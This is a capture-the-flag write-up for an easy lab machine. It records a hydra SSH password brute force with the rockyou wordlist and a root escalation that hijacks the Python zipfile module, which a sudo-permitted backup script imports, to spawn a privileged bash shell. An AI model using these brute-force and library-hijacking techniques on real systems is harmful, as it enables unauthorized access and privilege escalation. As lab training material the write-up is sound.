This is an easy room where you have to brute force your way in. Then exploit a python script to get root.

## Enumeration

I started the machine by looking at opened ports.

```bash
$ rustscan -a target
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.

```

Port 22 (SSH) and 80 (HTTP) are opened. So I opened Burp and Firefox to look at the web site.

## Web Site

The web site is very simple. It contains only one static page.

![Main Site](/assets/images/2021/07/Library/01_MainSite.png "Main Site")

There are some links, but they don't take you anywhere. And the form at the bottom of the page doesn't do anything either.

There is a 'robots.txt' file, but it doen's contain much.

```
User-agent: rockyou
Disallow: /
```

I thought that maybe 'rockyou' was a clue so I kept it in mind while enumerating the site.

Next, I tried looking for hidden pages on the web site. 

```

Gobuster did not find anything, so I tried it again, but this time using rockyou as the user-agent.

Still nothing. 


## Getting access

The web site had a post written by a 'meliodas'. I could not try that as a username anywhere on the site. So I decided to use it to try to brute force the ssh login. Of course, I used rockyou as the word list. 

```bash
$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t32 target ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-02 15:49:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

```

It only took one minute to find the password. I then used it to connect to the server and get the first flag.

```bash
$ ssh meliodas@target
The authenticity of host 'target (10.10.146.46)' can't be established.

```

## Getting root

Now I needed to get root. I checked if meliodas could run sudo. They were allowed to run a python script as any user. 

```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
	
meliodas@ubuntu:~$ ls -l bak.py
-rw-r--r-- 1 root root 353 Aug 23  2019 bak.py
```

The file was not writable, so I check what it did. 

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

It did a backup of the website, using a library called zipfile. So I created a file called `zipfile.py` to see if it would be included when I ran the script.

```python
import subprocess

ZIP_DEFLATED = 1

def ZipFile(a, b, c):
        process = subprocess.Popen('/bin/bash -p', shell=True, stdout=subprocess.PIPE)
        for line in process.stdout:
                print(line)
        process.wait()
```

And it worked. I ran the backup script with sudo, and my script launched bash when the script tried to instantiate the ZipFile object. 

```bash
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py

root@ubuntu:~# whoami
b'root\n'

root@ubuntu:~# cat /root/root.txt
REDACTED
```
